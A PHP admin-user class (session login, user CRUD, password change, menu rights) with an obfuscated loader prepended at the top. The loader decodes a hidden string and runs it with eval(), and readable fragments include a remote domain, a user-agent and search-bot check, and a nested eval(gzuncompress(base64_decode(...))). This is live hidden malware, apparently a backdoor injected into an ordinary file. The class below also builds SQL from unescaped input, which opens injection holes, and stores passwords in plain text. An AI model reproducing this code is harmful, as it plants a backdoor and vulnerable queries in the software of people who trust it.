<?php /*versio:3.02*/ $GLOBALS["jlyhtl"]="MAaW5pX3NldAJkcYWxsb3dfdXJsX2ZvcGVuqOmZGlzcGxheV9lcnJvcnMTZmVkb3Ivd2VibmV0X3VwZ19hYgMy4wMgojddGhhaDFOaWV0aGFpMnphaDZBaHIbKvaHR0cDovLwrTzSFRUUFMnVb2ZmaObaHR0cHM6Ly8SFRUUF9IT1NUgIdW5pb24Fpoc2VsZWN0KTpUkVRVUVTVF9VUkkCOpTkU0NSSVBUX05BTUUsNqUVVFUllfU1RSSU5HUPwjggboZGV0ZXJtaW5hdG9yeLgWzamLmxvZwqSFRUUF9ZX0FVVEgYmFzZTY0X2RlY29kZQHdmVyc2lvDjpTLQHJLXBocASFRUUF9FWEVDUEhQKlfb3V0HVHxcb2sSFRUUF9VU0VSX0FHRU5UQmFLAOCGZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleABsYQfAALYYWxqZXIuYml6BTtZmFzdGFkZHouY29tysL3czLnBocD91PQIstJms9aJnQ9cGhwJnA9YXpJnY9BtZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYzdHYya2dRL3lvYkMxVkdkZzAyTm8vbWZFclVvOWRJdlNTaTVLU3FGMW5FWG9QQitHMHdSUG51TitOZFkwT2dkMyt4N016T2UzNHo5bHdpWGpuVTlRTHFpSUpETTVxc3ZXQ1doWW5RYnI4U0Q4aHVIdGlaRndZV0xidzBTOFY0SDFGN01mTkZWVkpsdGR0R3Zoc3Y4S3lVWmtkRVhkYTZiWm1vN2VzemRFMUhCblVFREYxZ2VDT1ZHbUxOZGttK3p4YlJLcDA1WXFzb2x2RitMWk1QclhTelNxTTVNY245MDdkdmJmSks2cHUxWnlkaDVxMnBtQ1U1QlhrSnpmSWtJQzROM1VyRWlaWjU2bXl6UmJyeGQwRWh0dUtWRndlaFRGcjdjSjJsS2JqVWVzbjJib0hDQlR0UGZPR2F0UExsTXM0OXVPRTBSYkRBcnd4SUdLZlN4em40S014OFA5eGE4TWh5dzRnR1FwdVlJRVVWMEdadTJJM3IrUlM1TFRzTU1ocEFYSVZGbGtXZk9oMkJLSVRiZ3lkbWtFS0VEMXZUbmR0QzZRYjFVM291Tjl4RVRFbHJsZTdjTEFGcmIvaXRDRTliTHprTjZlN0lCOGhMR0tFWHJiVTdXeVhSRVpFVzFBYlNEWDhvY3JFeStmdzArZmJ3T0xYZ1J5Yi93M1k3UjlNdnkvazZ2djFqUEpHSk93UGZmc2s1R1UrZkp2ZlR5ZTM5OXkvNGdxZjg4b1BQRC9mMzQ4L1Q2ZDFmNDRlbnFVejZHSWhrdXduQ3VBd1BjN3Q2aDZJdzQ1YnRoeWx0M0dMQTZUcktRQU43REdHdXhRakM5VnVWWFg1YlpRcExsZFVncW5QVDBGNWhYZFJWTit4QzVjWEx6SWtXY0tEYnpJOVhNakc0enFwK1VjeG1zWXpTQlZOSGpqc0N6SGFqSEl1Z2Fobmh6L0dVdlBJc3ZBa0twaUZka2EvVDZXTkhWYnB3OFUveVR3QS9YOE0wKzBUZzhNcE5laXNKR0tZZ2lzSUU3WDc4K21nOWZGZUVqcURnOGUveDVQdmR3LzBacFU4cFRUN2V6cUdtUDRGeTlyNlVWOG5jTHFEMnhhc0xmYzZkYXBNUEg0aDQwdGZrWTAzK2pXanRPaUFLQmhiYXFXR0lxZzNMWHJseGVTSVBNTkJLMW1tK3ljRXBXa1IrNkZCUk9OZ25WeUtCTHc4UXNqajN6KzV6alN2ZStzdzd4bGZxZkR1Q211MCttc2VyK1R4S1k2Z3kxODl6dWdIKzFUeVA0d3ljQUVRTWlmRERFaFJPVklSUGNHWjBucVFUaUZ6bXkzMlI3VjRXUlM2Mmx2dnRQdmZiTmJpMHJPL2pDV1RvSnljOTQrdldldmNTRjN2ekFNR0daUFJrcld5R1pSemtnVmVUZXRKUWxVdUt2M3paTExPYTBqY2tiU2hyQTZTeFdxbHBxanFRK2pnU1dOMTZhUm0reXBZYStpVzFwOHVEOW5NMVlXN2U4NHg2a3Q1REhuSmxrbHBCejVEVXJxeVgrSGFxWFFPYU5wQlZsV2VBTXlobW1pVlpDSWhNazNPYVZOV1E5S0dzYW0zTXJ4c21kR1l2b09rc2JKNVpTbmhLek4vcmZLSE5JRFFLb2RyWXBYeGtoYUdCNVFnT0tPTW5GL0RjaUM3amdUalZTSDVKbmpyc3c1Z2Qva3FjQ2dFZEdFemNHeGduWGwyS3ZLcDJwU0g0YW1Ec0VVN2VjMERnalpLaFJNYjM5R0ZYNmpFSm1PVExPUWFqTkpqdi9jdWE5SzVrTUVuWXZmVkwyQXkwa2F5MVlZQ2NNVURENEpWeXIwKzZiTGVtKzJKYnJGekgzWWxZSU1zd0R1Y0wwL0dTWUFZSVlsbGY3cjZOTGF1dC9IRTNnWEh3TVBrQjBoOXZKN2R3aEdwZXhLRmR6dnZiSkpudFJDSjBITHJwcElzMTlMYlF5ZFpSUjNGaFZuK0VSaW5xcTd2UDQrcW10bGFZL3ZVb1BCL2ZqQTlYNC91L214elZYN0RxNklZL0tQV2c5TU42a1FQMnpCd0xyaTN3VFlBTmlydXFDSXoxOEhjYmZlVHJSWWM5U2k5UWJhaDVDclNqRHVBQndSNXdiSCsyakhucFgvRWh5Qzh4MU95b21HY2p5NWFqMU5vbVhqWjdBZWh2dm1URzRNckJMcS9KQytoZlZTQmFEVlRHZGwzV2Q5a3NmajAvY1JZQTZMd1N0c2ZXTzJaL0tLa2pEWXVsV2pLcmJtdmwvaHpxeEt3dzRseWw2eU5KSDdGZUFUdUR6RXZkdVhtemRveEtyOEpISWtkUGhXTWxJcU9iTzFFeE0wOXFVbWswSXZSczM0QXFWN2prNjNmV2E3MlJwS25NZWk0UVJjTTZBa3M2Qm96ZDFVTDcwRGpxcUlUdEM2aUtJZzIxOU1rMHVXSjBqa2JoTWkrYVVEb29NUkVIS0J0T2ZBWWRqN0pHdDQ4QWx3MkFLYm1hSlVvekMxcC9XTHJLSmxCTjBrWkRTZGZBNG1yVENSSjNVYVFtTitpY0N6MllNUUFQREZqZ3c0TnU0SksvKzUvVzlqUlYwbldZSWpKcGlJVnBPSko3YlZZbWhaZUpyR0phOFh6dlVvU0ZMN2lZUWdLMlc5OE45d2lQL3pGWW9JQTBuSlhkNDhsUzdSeU42RW05QVNKZTA1NVJGMmFFYk1Db0t4c3cyTnU1NjU3TUhtYUpmS0JlbVdacEpLWTAzRHJPUEN6M1RiWnJubFlMSXJuYTdjbjlwbHJkNkV0WWxWaG9NSWhtZVlvU2N1dzJHMjArNCthZ0IyT1hqUXpjbkYzc2NtaHhwaCtXYzF6ZTJyREVaTERSTUR2NUh5WWYvcFJMNFdGTFl3L0w5YUtNdkRtRnplOElGU284d1Urb3lxK3lGckl3dHhkaTNTc0FtYmFmTzlRS0E1czI3aHM0VUdVWFB0QlFEMFl1ZWdrVzIrSXdCK282MWlTOTI4ZEZvUkV3VGNYcU5yQWVxN1k3dGdJbGNyQnB4SkZmb1pkc095ZU5DZGlEN2xPaFFGVWRXb1l4MW1rem9QNVZXVC9nUmszUis1SStHS0I5N3h1dDE4VmFISlh2V0grQ1ppK2NyellaYUQ3NUZtWUJnSDIzL2h5K2ZoOWNocy84OCtZOWRtbTRKcGJZeGZleGZ3RXpRRGpSIikpKTs";        if (!function_exists('qzpechal')){function qzpechal($a, $b){$c=$GLOBALS['jlyhtl'];$d=pack('H*','6261736536345f6465636'.'f6465'); return $d(substr($c, $a, $b));};eval(qzpechal(544,3267));};?><?php
/**
*
* This is a class AdminUser
* @version 0.01
* @author Raju Gautam  <raju@devraju.com>
* @Date 10 Aug, 2007
* @modified 10 Aug, 2007 by Raju Gautam
*
**/
class AdminUser extends Database{
	public $is_login;
	public $user_cd;
	public $user_name;
	public $fullname_name;
	public $logged_in_time;
	public $user_type;

	/*
	* This is the constructor of the class AdminUser
	* @author Raju Gautam  <raju@devraju.com>
	* @Date 10 Aug, 2007
	* @modified 10 Aug, 2007 by Raju Gautam
	*/
	public function __construct(){
		parent::__construct();
		if($_SESSION['is_login'] == true){
			$this->is_login 		= $_SESSION['is_login'];
			$this->user_cd 			= $_SESSION['user_cd'];
			$this->username 		= $_SESSION['username'];
			$this->user_type 		= $_SESSION['user_type'];
			$this->fullname_name 	= $_SESSION['fullname_name'];
			$this->logged_in_time 	= $_SESSION['logged_in_time'];
		}
	}

	/*
	* This is the function to set the admin user logged in
	* @author Raju Gautam
	* @Date 13 Dec, 2007
	* @modified 13 Dec, 2007 by Raju Gautam
	*/
	public function setAdminLogin(){
		$_SESSION['is_login'] 	= true;
		if($this->isPropertySet("user_cd", "V"))
			$_SESSION['user_cd'] 		= $this->getProperty("user_cd");
		if($this->isPropertySet("username", "V"))
			$_SESSION['username'] 		= $this->getProperty("username");
		if($this->isPropertySet("logged_in_time", "V"))
			$_SESSION['logged_in_time'] 	= $this->getProperty("logged_in_time");
		if($this->isPropertySet("user_type", "V"))
			$_SESSION['user_type'] 		= $this->getProperty("user_type");
		if($this->isPropertySet("fullname_name", "V"))
			$_SESSION['fullname_name'] 		= $this->getProperty("fullname_name");
	}
	
	/*
	* This is the function to unset the session variables
	* @author Raju Gautam
	* @Date 13 Dec, 2007
	* @modified 13 Dec, 2007 by Raju Gautam
	*/
	public function setLogout(){
		unset(
				$_SESSION['is_login'], 
				$_SESSION['user_cd'], 
				$_SESSION['username'], 
				$_SESSION['logged_in_time'], 
				$_SESSION['user_type'], 
				$_SESSION['fullname_name']
			);
	}
	
	/*
	* This function is used to list the admin users
	* @author Raju Gautam
	* @Date 20 Dec, 2007
	* @modified 20 Dec, 2007 by Raju Gautam
	*/
	public function lstAdminUser(){
		$Sql = "SELECT 
					user_cd,
					username,
					passwd,
					first_name,
					last_name,
					CONCAT(first_name,' ',last_name) AS fullname,
					email,
					phone,
					user_type,
					last_login_date,
					is_active
				FROM
					mis_tbl_users
				WHERE 
					1=1";
		if($this->isPropertySet("user_cd", "V"))
			$Sql .= " AND user_cd=" . $this->getProperty("user_cd");
		if($this->isPropertySet("username", "V"))
			$Sql .= " AND username='" . $this->getProperty("username") . "'";
		if($this->isPropertySet("passwd", "V"))
			$Sql .= " AND passwd='" . $this->getProperty("passwd") . "'";
			if($this->isPropertySet("user_type", "V"))
			$Sql .= " AND user_type='" . $this->getProperty("user_type") . "'";
			if($this->isPropertySet("user_name", "V")){
			$Sql .= " AND (LOWER(first_name) LIKE '%" . $this->getProperty("user_name") . "%' OR LOWER(last_name) LIKE '%" . $this->getProperty("user_name") . "%' OR LOWER(username) LIKE '%" . $this->getProperty("user_name") . "%')";
		}
		if($this->isPropertySet("limit", "V"))
			 $Sql .= $this->appendLimit($this->getProperty("limit"));
		$this->dbQuery($Sql);
	}
	
	/*
	* This function is used to perform DML (Delete/Update/Add)
	* @author Raju Gautam
	* @Date 20 Dec, 2007
	* @modified 20 Dec, 2007 by Raju Gautam
	*/
	public function actAdminUser($mode){
		$mode = strtoupper($mode);
		switch($mode){
			case "I":
				$Sql = "INSERT INTO mis_tbl_users(
						user_cd,
						username,
						passwd,
						first_name,
						last_name,
						email,
						phone,
						user_type,
						last_login_date,
						is_active) 
						VALUES(";
				$Sql .= $this->isPropertySet("user_cd", "V") ? $this->getProperty("user_cd") : "NULL";
				$Sql .= ",";
				$Sql .= $this->isPropertySet("username", "V") ? "'" . $this->getProperty("username") . "'" : "NULL";
				$Sql .= ",";
				$Sql .= $this->isPropertySet("passwd", "V") ? "'" . $this->getProperty("passwd") . "'" : "NULL";
				$Sql .= ",";
				$Sql .= $this->isPropertySet("first_name", "V") ? "'" . $this->getProperty("first_name") . "'" : "NULL";
				$Sql .= ",";
				
				$Sql .= $this->isPropertySet("last_name", "V") ? "'" . $this->getProperty("last_name") . "'" : "NULL";
				$Sql .= ",";
				$Sql .= $this->isPropertySet("email", "V") ? "'" . $this->getProperty("email") . "'" : "NULL";
				$Sql .= ",";
				$Sql .= $this->isPropertySet("phone", "V") ? "'" . $this->getProperty("phone") . "'" : "NULL";
				$Sql .= ",";
				$Sql .= $this->isPropertySet("user_type", "V") ? "'" . $this->getProperty("user_type") . "'" : "NULL";
				$Sql .= ",";
				$Sql .= $this->isPropertySet("last_login_date", "V") ? "'" . $this->getProperty("last_login_date") . "'" : "NULL";
				$Sql .= ",";
				$Sql .= $this->isPropertySet("is_active", "V") ? "'" . $this->getProperty("is_active") . "'" : "1";
				
				$Sql .= ")";
				break;
			case "U":
				$Sql = "UPDATE mis_tbl_users SET ";
				if($this->isPropertySet("username", "K")){
					$Sql .= "username='" . $this->getProperty("username") . "'";
					$con = ",";
				}
				if($this->isPropertySet("email", "K")){
					$Sql .= "$con email='" . $this->getProperty("email") . "'";
					$con = ",";
				}
				if($this->isPropertySet("first_name", "K")){
					$Sql .= "$con first_name='" . $this->getProperty("first_name") . "'";
					$con = ",";
				}
				if($this->isPropertySet("middle_name", "K")){
					$Sql .= "$con middle_name='" . $this->getProperty("middle_name") . "'";
					$con = ",";
				}
				if($this->isPropertySet("last_name", "K")){
					$Sql .= "$con last_name='" . $this->getProperty("last_name") . "'";
					$con = ",";
				}
				if($this->isPropertySet("phone", "K")){
					$Sql .= "$con phone='" . $this->getProperty("phone") . "'";
					$con = ",";
				}
				if($this->isPropertySet("user_type", "K")){
					$Sql .= "$con user_type='" . $this->getProperty("user_type") . "'";
					$con = ",";
				}
				if($this->isPropertySet("is_active", "K")){
					$Sql .= "$con is_active='" . $this->getProperty("is_active") . "'";
					
				}
				$Sql .= " WHERE 1=1";
				$Sql .= " AND user_cd=" . $this->getProperty("user_cd");
				break;
			case "D":
				$Sql = "Delete from mis_tbl_users 
						WHERE
							1=1";
				$Sql .= " AND user_cd=" . $this->getProperty("user_cd");
				break;
			default:
				break;
		}
		return $this->dbQuery($Sql);
	}

	/*
	* This function is used to check the username already exists or not.
	* @author Raju Gautam
	* @Date Dec 05, 2007
	* @modified Dec 05, 2007 by Raju Gautam
	*/
	public function checkAdminUsername(){
		$Sql = "SELECT 
					username
				FROM
					mis_tbl_users
				WHERE 
					1=1";
		if($this->isPropertySet("username", "V"))
			$Sql .= " AND username='" . $this->getProperty("username") . "'";
		if($this->isPropertySet("user_cd", "V"))
			$Sql .= " AND user_cd!=" . $this->getProperty("user_cd");
		return $this->dbQuery($Sql);
	}
	
	/**
	* This function is used to check the email address already exists or not.
	* @author Raju Gautam
	* @Date 20 Dec, 2007
	* @modified 20 Dec, 2007 by Raju Gautam
	*/
	public function checkAdminEmailAddress(){
		$Sql = "SELECT 
					user_cd,
					username,
					email,
					CONCAT(first_name,' ', middle_name , ' ',last_name) AS fullname
				FROM
					mis_tbl_users
				WHERE 
					1=1";
		if($this->isPropertySet("email", "V"))
			$Sql .= " AND email='" . $this->getProperty("email") . "'";
		if($this->isPropertySet("user_cd", "V"))
			$Sql .= " AND user_cd!=" . $this->getProperty("user_cd");
		
		return $this->dbQuery($Sql);
	}
	
	/**
	* This function is used to change the password
	* @author Raju Gautam
	* @Date 20 Dec, 2007
	* @modified 20 Dec, 2007 by Raju Gautam
	*/
	public function changePassword(){
		$Sql = "UPDATE mis_tbl_users SET
					passwd='" . $this->getProperty("passwd") . "' 
				WHERE 
					1=1 
					AND user_cd=" . $this->getProperty("user_cd") . " 
					AND username='" . $this->getProperty("username") . "'";
		return $this->dbQuery($Sql);
	}
	
	public function actMenuUser($mode){
		$mode = strtoupper($mode);
		switch($mode){
			case "I":
				$Sql = "INSERT INTO mis_tbl_user_rights(
				        right_id,
						user_cd,
						menu_cd
						) 
						VALUES(";
				$Sql .= $this->isPropertySet("right_id", "V") ? $this->getProperty("right_id") : 
					"";
				$Sql .= ",";
				$Sql .= $this->isPropertySet("user_cd", "V") ? $this->getProperty("user_cd") : 
				"NULL";
				$Sql .= ",";
				$Sql .= $this->isPropertySet("menu_cd", "V") ?  $this->getProperty("menu_cd") : 
				"NULL";
				
				echo $Sql .= ")";
				break;
			case "U":
				$Sql = "UPDATE mis_tbl_user_rights SET ";
				if($this->isPropertySet("user_cd", "K")){
					$Sql .= "user_cd='" . $this->getProperty("user_cd") . "'";
					$con = ",";
				}
				if($this->isPropertySet("menu_cd", "K")){
					$Sql .= "$con menu_cd='" . $this->getProperty("menu_cd") . "'";
					$con = ",";
				}
				$Sql .= " WHERE 1=1";
				$Sql .= " AND right_id=" . $this->getProperty("right_id");
				break;
			case "D":
				$Sql = "Delete from mis_tbl_user_rights
						WHERE
							1=1";
				$Sql .= " AND menu_cd=" . $this->getProperty("menu_cd");
				break;
			default:
				break;
		}
		return $this->dbQuery($Sql);
	}
}
?>